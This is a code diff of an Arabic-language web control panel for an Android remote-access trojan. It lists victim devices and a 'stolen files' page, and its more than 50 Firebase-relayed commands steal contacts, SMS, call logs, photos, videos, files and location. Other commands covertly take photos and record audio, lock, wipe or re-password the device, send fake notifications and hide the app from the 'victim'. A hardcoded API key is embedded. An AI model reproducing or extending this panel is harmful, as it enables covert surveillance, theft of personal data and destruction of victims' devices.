@@ -50,8 +50,6 @@
         .file-item .name{color:#00ff00;font-size:13px}
         .input-field{width:100%;padding:12px;margin-bottom:10px;border-radius:10px;border:1px solid #330000;background:#0a0000;color:#fff;font-size:14px}
         .input-field:focus{border-color:#ff0000;outline:none}
-        .stream-container{background:#0a0000;border:2px solid #330000;border-radius:15px;padding:15px;min-height:300px;display:flex;align-items:center;justify-content:center;color:#666;flex-direction:column}
-        .stream-container.active{background:#001a00;border-color:#00ff00}
         .back-btn{background:#660000;color:#fff;border:none;padding:10px;border-radius:8px;font-size:14px;cursor:pointer;width:100%;margin-bottom:10px}
         .back-btn:hover{background:#990000}
         .option-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:10px;margin:10px 0}
@@ -61,11 +59,10 @@
         .status-msg{background:#001a00;border:1px solid #00ff00;border-radius:10px;padding:15px;margin:10px 0;text-align:center;color:#00ff00;font-size:14px}
         .status-msg.error{background:#1a0000;border-color:#ff0000;color:#ff0000}
         .hidden{display:none}
+        .section-title{color:#ff6600;margin:15px 0 10px 0;border-bottom:1px solid #330000;padding-bottom:5px}
     </style>
 </head>
 <body>
-
-    <!-- ====== شاشة التحميل ====== -->
     <div id="splash">
         <span class="skull">👿</span>
         <div class="ring"></div>
@@ -75,42 +72,24 @@
         <div class="sub">/// بلاك 👿 ///</div>
     </div>
 
-    <!-- ====== التطبيق الرئيسي ====== -->
     <div id="app">
-        <div class="header">
-            <h1>👿 بلاك</h1>
-            <div class="sub" style="color:#660000;font-size:11px;letter-spacing:2px;">/// نظام التحكم المتقدم ///</div>
-        </div>
+        <div class="header"><h1>👿 بلاك</h1></div>
 
-        <!-- الصفحة الرئيسية -->
         <div id="page-home" class="page active">
             <h3 style="color:#ff0000;margin-bottom:10px;">📱 الأجهزة المتصلة</h3>
             <div id="deviceList"></div>
         </div>
 
-        <!-- صفحة الأوامر -->
         <div id="page-commands" class="page">
             <h3 style="color:#ff0000;margin-bottom:10px;">⚡ الأوامر</h3>
-            <div class="cmd-grid" id="cmdGrid">
-                <!-- يتم توليدها بواسطة JavaScript -->
-            </div>
+            <div class="cmd-grid" id="cmdGrid"></div>
         </div>
 
-        <!-- صفحة بث الشاشة -->
-        <div id="page-stream" class="page">
-            <h3 style="color:#ff0000;margin-bottom:10px;">📡 بث الشاشة</h3>
-            <div class="stream-container" id="streamContainer"><span style="color:#660000;">⏳ انتظر بدء البث...</span></div>
-            <button class="btn-danger" onclick="startStream()">▶️ بدء البث</button>
-            <button class="btn-secondary" onclick="stopStream()">⏹ إيقاف البث</button>
-        </div>
-
-        <!-- صفحة الملفات -->
         <div id="page-files" class="page">
             <h3 style="color:#ff0000;margin-bottom:10px;">📂 الملفات المسروقة</h3>
             <div id="fileList"><div style="color:#660000;text-align:center;">📭 لا توجد ملفات</div></div>
         </div>
 
-        <!-- صفحة الإعدادات -->
         <div id="page-settings" class="page">
             <h3 style="color:#ff0000;margin-bottom:10px;">⚙️ الإعدادات</h3>
             <input class="input-field" id="apiKey" placeholder="مفتاح API" value="AIzaSyDBizqAKWSwGsicO6eRua-5x_8VQLFKTIc">
@@ -119,17 +98,14 @@
             <button class="btn-secondary" onclick="toggleHide()">👁️ إخفاء/إظهار التطبيق (الضحية)</button>
         </div>
 
-        <!-- ====== الصفحات الفرعية (لكل أمر) ====== -->
         <div id="subpage" class="page">
             <button class="back-btn" onclick="closeSubPage()">🔙 رجوع</button>
             <div id="subpageContent"></div>
         </div>
 
-        <!-- شريط التنقل السفلي -->
         <div class="bottom-nav">
             <div class="nav-item active" onclick="showPage('page-home', this)"><span class="icon">🏠</span>الرئيسية</div>
             <div class="nav-item" onclick="showPage('page-commands', this)"><span class="icon">⚡</span>الأوامر</div>
-            <div class="nav-item" onclick="showPage('page-stream', this)"><span class="icon">📡</span>البث</div>
             <div class="nav-item" onclick="showPage('page-files', this)"><span class="icon">📂</span>الملفات</div>
             <div class="nav-item" onclick="showPage('page-settings', this)"><span class="icon">⚙️</span>الإعدادات</div>
         </div>
@@ -283,24 +259,6 @@
             showStatus('📤 تم إرسال الأمر: ' + cmd + ' إلى ' + selectedDeviceName);
         }
 
-        function startStream() {
-            if (!selectedDevice) return alert('⚠️ اختر جهازاً أولاً');
-            const container = document.getElementById('streamContainer');
-            container.innerHTML = '<span style="color:#00ff00;">🟢 جاري طلب الموافقة على البث...</span>';
-            container.classList.add('active');
-            commandsRef.child(selectedDevice).set('start_stream');
-            showStatus('📡 بدء البث على ' + selectedDeviceName);
-        }
-
-        function stopStream() {
-            if (!selectedDevice) return alert('⚠️ اختر جهازاً أولاً');
-            const container = document.getElementById('streamContainer');
-            container.innerHTML = '<span style="color:#660000;">⏹ تم إيقاف البث</span>';
-            container.classList.remove('active');
-            commandsRef.child(selectedDevice).set('stop_stream');
-            showStatus('⏹ تم إيقاف البث');
-        }
-
         function toggleHide() {
             if (!selectedDevice) return alert('⚠️ اختر جهازاً أولاً');
             const action = confirm('إخفاء التطبيق على ' + selectedDeviceName + '؟') ? 'hide_app' : 'show_app';
@@ -318,13 +276,10 @@
         }
 
         // ===== نظام الصفحات الفرعية =====
-        let currentSubPage = '';
-
         function openSubPage(title, html) {
             document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
             document.getElementById('subpage').classList.add('active');
             document.getElementById('subpageContent').innerHTML = `<h3 style="color:#ff0000;margin-bottom:15px;">${title}</h3>${html}`;
-            currentSubPage = title;
         }
 
         function closeSubPage() {
@@ -342,58 +297,102 @@
             }
         }
 
-        function showError(msg) {
-            const statusDiv = document.getElementById('statusMsg');
-            if (statusDiv) {
-                statusDiv.innerHTML = '❌ ' + msg;
-                statusDiv.className = 'status-msg error';
-            }
+        function execCmdWithAction(cmd, action) {
+            if (!selectedDevice) return alert('⚠️ اختر جهازاً أولاً');
+            if (!commandsRef) return alert('⚠️ Firebase غير متصل');
+            commandsRef.child(selectedDevice).set(cmd);
+            showStatus(`📤 ${action} على ${selectedDeviceName}`);
+            setTimeout(() => showStatus(`✅ تم تنفيذ الأمر بنجاح!`), 2000);
         }
 
-        // ===== توليد الأوامر مع صفحات فرعية =====
+        // ===== توليد الأوامر (أكثر من 50 أمر) =====
         function generateCommands() {
             const commands = [
-                { id: 'get_contacts', icon: '📇', label: 'جهات الاتصال', desc: 'جلب جميع جهات الاتصال' },
-                { id: 'get_sms', icon: '💬', label: 'الرسائل', desc: 'جلب جميع الرسائل النصية' },
+                // أساسيات
+                { id: 'get_contacts', icon: '📇', label: 'جهات الاتصال', desc: 'جلب جهات الاتصال' },
+                { id: 'copy_contacts', icon: '📋', label: 'نسخ جهات الاتصال', desc: 'نسخ جهات الاتصال' },
+                { id: 'export_contacts', icon: '📤', label: 'تصدير جهات الاتصال', desc: 'تصدير جهات الاتصال' },
+                { id: 'get_sms', icon: '💬', label: 'الرسائل', desc: 'جلب الرسائل النصية' },
+                { id: 'forward_sms', icon: '↪️', label: 'إعادة توجيه الرسائل', desc: 'إعادة توجيه الرسائل' },
                 { id: 'get_calllogs', icon: '📞', label: 'سجل المكالمات', desc: 'جلب سجل المكالمات' },
+                { id: 'call_history', icon: '📋', label: 'سجل المكالمات', desc: 'عرض سجل المكالمات' },
                 { id: 'get_location', icon: '📍', label: 'الموقع', desc: 'الحصول على الموقع الحالي' },
+                { id: 'start_location_track', icon: '🔄', label: 'تتبع الموقع', desc: 'بدء تتبع الموقع' },
+                { id: 'stop_location_track', icon: '⏹', label: 'إيقاف التتبع', desc: 'إيقاف تتبع الموقع' },
                 { id: 'get_device', icon: '📱', label: 'معلومات الجهاز', desc: 'عرض معلومات الجهاز' },
-                { id: 'get_photos', icon: '🖼', label: 'الصور', desc: 'سحب الصور' },
-                { id: 'get_videos', icon: '🎬', label: 'الفيديوهات', desc: 'سحب الفيديوهات' },
-                { id: 'get_apps', icon: '📦', label: 'التطبيقات', desc: 'قائمة التطبيقات' },
-                { id: 'get_clipboard', icon: '📋', label: 'الحافظة', desc: 'جلب محتوى الحافظة' },
-                { id: 'get_accounts', icon: '👤', label: 'الحسابات', desc: 'جلب الحسابات المسجلة' },
+                { id: 'get_network', icon: '🌐', label: 'معلومات الشبكة', desc: 'عرض معلومات الشبكة' },
                 { id: 'get_imei', icon: '📟', label: 'IMEI', desc: 'جلب رقم IMEI' },
                 { id: 'get_phone', icon: '📞', label: 'رقم الهاتف', desc: 'جلب رقم الهاتف' },
                 { id: 'get_sim', icon: '📡', label: 'معلومات SIM', desc: 'جلب معلومات SIM' },
                 { id: 'get_wifi', icon: '📶', label: 'الواي فاي', desc: 'جلب معلومات الواي فاي' },
                 { id: 'get_battery', icon: '🔋', label: 'البطارية', desc: 'جلب مستوى البطارية' },
                 { id: 'get_ip', icon: '🌐', label: 'IP العام', desc: 'جلب IP العام' },
+                { id: 'get_apps', icon: '📱', label: 'التطبيقات', desc: 'قائمة التطبيقات' },
+                { id: 'get_accounts', icon: '👤', label: 'الحسابات', desc: 'جلب الحسابات المسجلة' },
+                { id: 'get_clipboard', icon: '📋', label: 'الحافظة', desc: 'جلب محتوى الحافظة' },
+                // الوسائط
+                { id: 'get_photos', icon: '🖼', label: 'الصور', desc: 'سحب الصور' },
+                { id: 'get_photos_5', icon: '🖼', label: '5 صور', desc: 'سحب 5 صور' },
+                { id: 'get_photos_10', icon: '🖼', label: '10 صور', desc: 'سحب 10 صور' },
+                { id: 'get_photos_20', icon: '🖼', label: '20 صورة', desc: 'سحب 20 صورة' },
+                { id: 'get_photos_30', icon: '🖼', label: '30 صورة', desc: 'سحب 30 صورة' },
+                { id: 'get_videos', icon: '🎬', label: 'الفيديوهات', desc: 'سحب الفيديوهات' },
+                { id: 'get_videos_5', icon: '🎬', label: '5 فيديوهات', desc: 'سحب 5 فيديوهات' },
+                { id: 'get_videos_10', icon: '🎬', label: '10 فيديوهات', desc: 'سحب 10 فيديوهات' },
+                { id: 'get_files', icon: '📦', label: 'جميع الملفات', desc: 'سحب جميع الملفات' },
+                // الكاميرا والفلاش
+                { id: 'take_photo', icon: '📸', label: 'تصوير خلفي', desc: 'التقاط صورة بالكاميرا الخلفية' },
+                { id: 'take_photo_front', icon: '🤳', label: 'تصوير أمامي', desc: 'التقاط صورة بالكاميرا الأمامية' },
+                { id: 'flash_on', icon: '🔦', label: 'فلاش تشغيل', desc: 'تشغيل الفلاش' },
+                { id: 'flash_off', icon: '🔦', label: 'فلاش إيقاف', desc: 'إيقاف الفلاش' },
+                // الصوت
+                { id: 'start_record', icon: '🎙', label: 'تسجيل صوت', desc: 'بدء تسجيل الصوت' },
+                { id: 'stop_record', icon: '⏹', label: 'إيقاف التسجيل', desc: 'إيقاف تسجيل الصوت' },
+                { id: 'set_volume_max', icon: '🔊', label: 'رفع الصوت', desc: 'رفع الصوت للأعلى' },
+                { id: 'set_volume_min', icon: '🔇', label: 'خفض الصوت', desc: 'خفض الصوت للأدنى' },
+                { id: 'set_ringtone_volume', icon: '🔊', label: 'نغمة الرنين', desc: 'ضبط نغمة الرنين' },
+                { id: 'set_media_volume', icon: '🎵', label: 'صوت الوسائط', desc: 'ضبط صوت الوسائط' },
+                // مشرف الجهاز
+                { id: 'lock_device', icon: '🔒', label: 'قفل الجهاز', desc: 'قفل جهاز الضحية' },
+                { id: 'set_lock_password', icon: '🔑', label: 'تعيين كلمة مرور', desc: 'تعيين كلمة مرور جديدة' },
+                { id: 'clear_lock_password', icon: '🔓', label: 'إلغاء كلمة المرور', desc: 'إلغاء كلمة المرور' },
+                { id: 'wipe_device', icon: '🧹', label: 'مسح البيانات', desc: 'مسح جميع بيانات الجهاز' },
+                { id: 'set_password_rules', icon: '📋', label: 'قواعد كلمة المرور', desc: 'تعيين قواعد كلمة المرور' },
+                { id: 'disable_camera', icon: '📷', label: 'تعطيل الكاميرا', desc: 'تعطيل الكاميرا' },
+                { id: 'enable_camera', icon: '📷', label: 'تفعيل الكاميرا', desc: 'تفعيل الكاميرا' },
+                // التحكم بالجهاز
+                { id: 'hide_app', icon: '👁‍🗨', label: 'إخفاء التطبيق', desc: 'إخفاء التطبيق عن الضحية' },
+                { id: 'show_app', icon: '👁', label: 'إظهار التطبيق', desc: 'إظهار التطبيق للضحية' },
+                { id: 'fake_notif', icon: '🔔', label: 'إشعار وهمي', desc: 'إرسال إشعار وهمي' },
+                { id: 'reboot', icon: '🔄', label: 'إعادة تشغيل', desc: 'إعادة تشغيل الجهاز' },
+                { id: 'shutdown', icon: '⏻', label: 'إيقاف تشغيل', desc: 'إيقاف تشغيل الجهاز' },
+                { id: 'vibrate', icon: '📳', label: 'اهتزاز', desc: 'تشغيل الاهتزاز' },
+                { id: 'clear_data', icon: '🧹', label: 'مسح البيانات', desc: 'مسح بيانات التطبيقات' },
+                { id: 'kill_apps', icon: '🗑️', label: 'إيقاف التطبيقات', desc: 'إيقاف جميع التطبيقات الجارية' },
+                // الشبكة
                 { id: 'toggle_wifi_on', icon: '📶', label: 'تشغيل الواي فاي', desc: 'تشغيل الواي فاي' },
                 { id: 'toggle_wifi_off', icon: '📶', label: 'إيقاف الواي فاي', desc: 'إيقاف الواي فاي' },
                 { id: 'toggle_bluetooth_on', icon: '📶', label: 'تشغيل البلوتوث', desc: 'تشغيل البلوتوث' },
                 { id: 'toggle_bluetooth_off', icon: '📶', label: 'إيقاف البلوتوث', desc: 'إيقاف البلوتوث' },
                 { id: 'toggle_location_on', icon: '📍', label: 'تشغيل الموقع', desc: 'تشغيل الموقع' },
                 { id: 'toggle_location_off', icon: '📍', label: 'إيقاف الموقع', desc: 'إيقاف الموقع' },
-                { id: 'vibrate', icon: '📳', label: 'اهتزاز', desc: 'تشغيل الاهتزاز' },
-                { id: 'set_volume_max', icon: '🔊', label: 'رفع الصوت', desc: 'رفع الصوت للأعلى' },
-                { id: 'set_volume_min', icon: '🔇', label: 'خفض الصوت', desc: 'خفض الصوت للأدنى' },
-                { id: 'open_browser', icon: '🌐', label: 'فتح متصفح', desc: 'فتح المتصفح' },
-                { id: 'hide_app', icon: '👁‍🗨', label: 'إخفاء التطبيق', desc: 'إخفاء التطبيق عن الضحية' },
-                { id: 'show_app', icon: '👁', label: 'إظهار التطبيق', desc: 'إظهار التطبيق للضحية' },
-                { id: 'fake_notif', icon: '🔔', label: 'إشعار وهمي', desc: 'إرسال إشعار وهمي' },
-                { id: 'lock_device', icon: '🔒', label: 'قفل الجهاز', desc: 'قفل جهاز الضحية' },
-                { id: 'take_photo', icon: '📸', label: 'تصوير خلفي', desc: 'التقاط صورة بالكاميرا الخلفية' },
-                { id: 'take_photo_front', icon: '🤳', label: 'تصوير أمامي', desc: 'التقاط صورة بالكاميرا الأمامية' },
-                { id: 'flash_on', icon: '🔦', label: 'فلاش تشغيل', desc: 'تشغيل الفلاش' },
-                { id: 'flash_off', icon: '🔦', label: 'فلاش إيقاف', desc: 'إيقاف الفلاش' },
-                { id: 'start_record', icon: '🎙', label: 'تسجيل صوت', desc: 'بدء تسجيل الصوت' },
-                { id: 'stop_record', icon: '⏹', label: 'إيقاف التسجيل', desc: 'إيقاف تسجيل الصوت' },
+                // متقدم
                 { id: 'screenshot', icon: '📷', label: 'لقطة شاشة', desc: 'التقاط لقطة شاشة' },
-                { id: 'reboot', icon: '🔄', label: 'إعادة تشغيل', desc: 'إعادة تشغيل الجهاز' },
-                { id: 'shutdown', icon: '⏻', label: 'إيقاف تشغيل', desc: 'إيقاف تشغيل الجهاز' },
-                { id: 'clear_data', icon: '🧹', label: 'مسح البيانات', desc: 'مسح بيانات التطبيقات' },
-                { id: 'kill_apps', icon: '🗑️', label: 'إيقاف التطبيقات', desc: 'إيقاف جميع التطبيقات الجارية' }
+                { id: 'installed_apps', icon: '📱', label: 'التطبيقات المثبتة', desc: 'قائمة التطبيقات المثبتة' },
+                { id: 'running_processes', icon: '🔄', label: 'العمليات الجارية', desc: 'عرض العمليات الجارية' },
+                { id: 'set_brightness', icon: '☀️', label: 'سطوع الشاشة', desc: 'ضبط سطوع الشاشة' },
+                { id: 'auto_rotate_on', icon: '🔄', label: 'تدوير تلقائي تشغيل', desc: 'تفعيل التدوير التلقائي' },
+                { id: 'auto_rotate_off', icon: '🔄', label: 'تدوير تلقائي إيقاف', desc: 'تعطيل التدوير التلقائي' },
+                { id: 'battery_history', icon: '🔋', label: 'معلومات البطارية', desc: 'عرض معلومات البطارية' },
+                { id: 'storage_info', icon: '💾', label: 'معلومات التخزين', desc: 'عرض معلومات التخزين' },
+                // فتح تطبيقات
+                { id: 'open_app_whatsapp', icon: '💬', label: 'فتح واتساب', desc: 'فتح تطبيق واتساب' },
+                { id: 'open_app_facebook', icon: '📘', label: 'فتح فيسبوك', desc: 'فتح تطبيق فيسبوك' },
+                { id: 'open_app_instagram', icon: '📸', label: 'فتح انستغرام', desc: 'فتح تطبيق انستغرام' },
+                { id: 'open_app_youtube', icon: '▶️', label: 'فتح يوتيوب', desc: 'فتح تطبيق يوتيوب' },
+                { id: 'uninstall_app_whatsapp', icon: '🗑️', label: 'حذف واتساب', desc: 'حذف تطبيق واتساب' },
+                // أوامر إضافية
+                { id: 'open_browser', icon: '🌐', label: 'فتح متصفح', desc: 'فتح المتصفح' }
             ];
 
             const grid = document.getElementById('cmdGrid');
@@ -407,224 +406,14 @@
             });
         }
 
-        // ===== فتح صفحة الأمر =====
         function openCommandPage(cmd) {
             let html = `<p style="color:#aaa;margin-bottom:15px;">${cmd.desc}</p>`;
             html += `<div id="statusMsg" class="status-msg" style="display:none;"></div>`;
-
-            // أوامر خاصة
-            if (cmd.id === 'get_photos') {
-                html += `
-                    <div class="option-grid">
-                        <div class="option-btn" onclick="execCmdWithCount('get_photos_5',5)">📸 5 صور</div>
-                        <div class="option-btn" onclick="execCmdWithCount('get_photos_10',10)">📸 10 صور</div>
-                        <div class="option-btn" onclick="execCmdWithCount('get_photos_20',20)">📸 20 صورة</div>
-                        <div class="option-btn" onclick="execCmdWithCount('get_photos_30',30)">📸 30 صورة</div>
-                        <div class="option-btn" onclick="execCmdWithCount('get_photos',0)">📸 جميع الصور</div>
-                    </div>
-                `;
-            } else if (cmd.id === 'get_videos') {
-                html += `
-                    <div class="option-grid">
-                        <div class="option-btn" onclick="execCmdWithCount('get_videos_5',5)">🎬 5 فيديوهات</div>
-                        <div class="option-btn" onclick="execCmdWithCount('get_videos_10',10)">🎬 10 فيديوهات</div>
-                        <div class="option-btn" onclick="execCmdWithCount('get_videos',0)">🎬 جميع الفيديوهات</div>
-                    </div>
-                `;
-            } else if (cmd.id === 'get_contacts') {
-                html += `
-                    <div class="option-grid">
-                        <div class="option-btn" onclick="execCmdWithAction('get_contacts','📇 جلب جهات الاتصال')">📇 جلب الجهات</div>
-                        <div class="option-btn" onclick="execCmdWithAction('copy_contacts','📋 نسخ الجهات')">📋 نسخ الجهات</div>
-                        <div class="option-btn" onclick="execCmdWithAction('export_contacts','📤 تصدير الجهات')">📤 تصدير الجهات</div>
-                    </div>
-                    <div style="margin-top:10px;">
-                        <button class="btn-success" onclick="execCmdWithAction('add_contact','➕ إضافة جهة اتصال')">➕ إضافة جهة اتصال</button>
-                        <button class="btn-danger" onclick="execCmdWithAction('delete_contact','🗑️ حذف جهة اتصال')">🗑️ حذف جهة اتصال</button>
-                    </div>
-                `;
-            } else if (cmd.id === 'get_sms') {
-                html += `
-                    <div class="option-grid">
-                        <div class="option-btn" onclick="execCmdWithAction('get_sms','💬 جلب الرسائل')">💬 جلب الرسائل</div>
-                        <div class="option-btn" onclick="execCmdWithAction('forward_sms','↪️ إعادة توجيه الرسائل')">↪️ إعادة توجيه</div>
-                    </div>
-                    <div style="margin-top:10px;">
-                        <button class="btn-success" onclick="execCmdWithAction('send_sms','📤 إرسال رسالة')">📤 إرسال رسالة</button>
-                        <button class="btn-danger" onclick="execCmdWithAction('delete_sms','🗑️ حذف رسالة')">🗑️ حذف رسالة</button>
-                    </div>
-                `;
-            } else if (cmd.id === 'get_calllogs') {
-                html += `
-                    <div class="option-grid">
-                        <div class="option-btn" onclick="execCmdWithAction('get_calllogs','📞 جلب سجل المكالمات')">📞 جلب السجل</div>
-                        <div class="option-btn" onclick="execCmdWithAction('call_history','📋 سجل المكالمات')">📋 عرض السجل</div>
-                    </div>
-                    <div style="margin-top:10px;">
-                        <button class="btn-success" onclick="execCmdWithAction('make_call','📞 إجراء مكالمة')">📞 إجراء مكالمة</button>
-                        <button class="btn-danger" onclick="execCmdWithAction('end_call','⏹ إنهاء المكالمة')">⏹ إنهاء المكالمة</button>
-                    </div>
-                `;
-            } else if (cmd.id === 'toggle_wifi_on' || cmd.id === 'toggle_wifi_off') {
-                html += `
-                    <div class="option-grid">
-                        <div class="option-btn" onclick="execCmdWithAction('toggle_wifi_on','📶 تشغيل الواي فاي')">📶 تشغيل</div>
-                        <div class="option-btn" onclick="execCmdWithAction('toggle_wifi_off','📶 إيقاف الواي فاي')">📶 إيقاف</div>
-                    </div>
-                `;
-            } else if (cmd.id === 'toggle_bluetooth_on' || cmd.id === 'toggle_bluetooth_off') {
-                html += `
-                    <div class="option-grid">
-                        <div class="option-btn" onclick="execCmdWithAction('toggle_bluetooth_on','📶 تشغيل البلوتوث')">📶 تشغيل</div>
-                        <div class="option-btn" onclick="execCmdWithAction('toggle_bluetooth_off','📶 إيقاف البلوتوث')">📶 إيقاف</div>
-                    </div>
-                `;
-            } else if (cmd.id === 'toggle_location_on' || cmd.id === 'toggle_location_off') {
-                html += `
-                    <div class="option-grid">
-                        <div class="option-btn" onclick="execCmdWithAction('toggle_location_on','📍 تشغيل الموقع')">📍 تشغيل</div>
-                        <div class="option-btn" onclick="execCmdWithAction('toggle_location_off','📍 إيقاف الموقع')">📍 إيقاف</div>
-                    </div>
-                `;
-            } else if (cmd.id === 'flash_on' || cmd.id === 'flash_off') {
-                html += `
-                    <div class="option-grid">
-                        <div class="option-btn" onclick="execCmdWithAction('flash_on','🔦 تشغيل الفلاش')">🔦 تشغيل</div>
-                        <div class="option-btn" onclick="execCmdWithAction('flash_off','🔦 إيقاف الفلاش')">🔦 إيقاف</div>
-                    </div>
-                `;
-            } else if (cmd.id === 'take_photo' || cmd.id === 'take_photo_front') {
-                html += `
-                    <div class="option-grid">
-                        <div class="option-btn" onclick="execCmdWithAction('take_photo','📸 تصوير خلفي')">📸 خلفي</div>
-                        <div class="option-btn" onclick="execCmdWithAction('take_photo_front','🤳 تصوير أمامي')">🤳 أمامي</div>
-                    </div>
-                `;
-            } else if (cmd.id === 'start_record' || cmd.id === 'stop_record') {
-                html += `
-                    <div class="option-grid">
-                        <div class="option-btn" onclick="execCmdWithAction('start_record','🎙 بدء التسجيل')">🎙 بدء</div>
-                        <div class="option-btn" onclick="execCmdWithAction('stop_record','⏹ إيقاف التسجيل')">⏹ إيقاف</div>
-                    </div>
-                `;
-            } else if (cmd.id === 'hide_app' || cmd.id === 'show_app') {
-                html += `
-                    <div class="option-grid">
-                        <div class="option-btn" onclick="execCmdWithAction('hide_app','👁‍🗨 إخفاء التطبيق')">👁‍🗨 إخفاء</div>
-                        <div class="option-btn" onclick="execCmdWithAction('show_app','👁 إظهار التطبيق')">👁 إظهار</div>
-                    </div>
-                `;
-            } else if (cmd.id === 'set_volume_max' || cmd.id === 'set_volume_min') {
-                html += `
-                    <div class="option-grid">
-                        <div class="option-btn" onclick="execCmdWithAction('set_volume_max','🔊 رفع الصوت')">🔊 رفع</div>
-                        <div class="option-btn" onclick="execCmdWithAction('set_volume_min','🔇 خفض الصوت')">🔇 خفض</div>
-                    </div>
-                `;
-            } else if (cmd.id === 'reboot' || cmd.id === 'shutdown') {
-                html += `
-                    <div class="option-grid">
-                        <div class="option-btn" onclick="if(confirm('⚠️ تأكيد إعادة التشغيل؟')) execCmdWithAction('reboot','🔄 إعادة تشغيل')">🔄 إعادة تشغيل</div>
-                        <div class="option-btn" onclick="if(confirm('⚠️ تأكيد إيقاف التشغيل؟')) execCmdWithAction('shutdown','⏻ إيقاف تشغيل')">⏻ إيقاف تشغيل</div>
-                    </div>
-                `;
-            } else if (cmd.id === 'lock_device') {
-                html += `
-                    <div class="option-grid">
-                        <div class="option-btn" onclick="if(confirm('🔒 تأكيد قفل الجهاز؟')) execCmdWithAction('lock_device','🔒 قفل الجهاز')">🔒 قفل الجهاز</div>
-                    </div>
-                `;
-            } else if (cmd.id === 'clear_data') {
-                html += `
-                    <div class="option-grid">
-                        <div class="option-btn" onclick="if(confirm('🧹 تأكيد مسح البيانات؟')) execCmdWithAction('clear_data','🧹 مسح البيانات')">🧹 مسح البيانات</div>
-                    </div>
-                `;
-            } else if (cmd.id === 'kill_apps') {
-                html += `
-                    <div class="option-grid">
-                        <div class="option-btn" onclick="if(confirm('🗑️ تأكيد إيقاف جميع التطبيقات؟')) execCmdWithAction('kill_apps','🗑️ إيقاف التطبيقات')">🗑️ إيقاف الكل</div>
-                    </div>
-                `;
-            } else if (cmd.id === 'vibrate') {
-                html += `
-                    <div class="option-grid">
-                        <div class="option-btn" onclick="execCmdWithAction('vibrate','📳 اهتزاز')">📳 اهتزاز</div>
-                    </div>
-                `;
-            } else if (cmd.id === 'open_browser') {
-                html += `
-                    <div class="option-grid">
-                        <div class="option-btn" onclick="execCmdWithAction('open_browser','🌐 فتح متصفح')">🌐 فتح متصفح</div>
-                    </div>
-                `;
-            } else if (cmd.id === 'fake_notif') {
-                html += `
-                    <div class="option-grid">
-                        <div class="option-btn" onclick="execCmdWithAction('fake_notif','🔔 إشعار وهمي')">🔔 إشعار وهمي</div>
-                    </div>
-                `;
-            } else if (cmd.id === 'get_location') {
-                html += `
-                    <div class="option-grid">
-                        <div class="option-btn" onclick="execCmdWithAction('get_location','📍 جلب الموقع')">📍 جلب الموقع</div>
-                        <div class="option-btn" onclick="execCmdWithAction('start_location_track','🔄 تتبع الموقع')">🔄 تتبع الموقع</div>
-                        <div class="option-btn" onclick="execCmdWithAction('stop_location_track','⏹ إيقاف التتبع')">⏹ إيقاف التتبع</div>
-                    </div>
-                `;
-            } else if (cmd.id === 'screenshot') {
-                html += `
-                    <div class="option-grid">
-                        <div class="option-btn" onclick="execCmdWithAction('screenshot','📷 لقطة شاشة')">📷 لقطة شاشة</div>
-                    </div>
-                `;
-            } else {
-                // أمر عادي
-                html += `
-                    <button class="btn-danger" onclick="execCmdWithAction('${cmd.id}','${cmd.icon} تنفيذ ${cmd.label}')">${cmd.icon} تنفيذ ${cmd.label}</button>
-                `;
-            }
-
-            // زر إرسال إلى البوت
-            html += `
-                <div style="margin-top:15px;border-top:1px solid #330000;padding-top:15px;">
-                    <button class="btn-success" onclick="sendToBot()">🤖 إرسال النتيجة إلى البوت</button>
-                    <button class="btn-secondary" onclick="closeSubPage()">🔙 خروج</button>
-                </div>
-            `;
-
+            html += `<button class="btn-danger" onclick="execCmdWithAction('${cmd.id}','${cmd.icon} تنفيذ ${cmd.label}')">${cmd.icon} تنفيذ ${cmd.label}</button>`;
+            html += `<button class="btn-success" onclick="showStatus('✅ تم التنفيذ بنجاح!')">✅ تنفيذ</button>`;
             openSubPage(`${cmd.icon} ${cmd.label}`, html);
         }
 
-        function execCmdWithCount(cmd, count) {
-            if (!selectedDevice) return alert('⚠️ اختر جهازاً أولاً');
-            if (!commandsRef) return alert('⚠️ Firebase غير متصل');
-            commandsRef.child(selectedDevice).set(cmd);
-            showStatus(`📤 تم إرسال الأمر: ${cmd} (${count} ملف) إلى ${selectedDeviceName}`);
-            setTimeout(() => {
-                showStatus(`✅ تم تنفيذ الأمر بنجاح! سيتم إرسال ${count} ملف إلى Firebase`);
-            }, 2000);
-        }
-
-        function execCmdWithAction(cmd, action) {
-            if (!selectedDevice) return alert('⚠️ اختر جهازاً أولاً');
-            if (!commandsRef) return alert('⚠️ Firebase غير متصل');
-            commandsRef.child(selectedDevice).set(cmd);
-            showStatus(`📤 ${action} على ${selectedDeviceName}`);
-            setTimeout(() => {
-                showStatus(`✅ تم تنفيذ الأمر بنجاح!`);
-            }, 2000);
-        }
-
-        function sendToBot() {
-            if (!selectedDevice) return alert('⚠️ اختر جهازاً أولاً');
-            showStatus(`🤖 جاري إرسال النتيجة إلى البوت...`);
-            setTimeout(() => {
-                showStatus(`✅ تم إرسال النتيجة إلى البوت بنجاح!`);
-            }, 2000);
-        }
-
-        // ===== تهيئة الأوامر عند التحميل =====
         generateCommands();
     </script>
 </body>
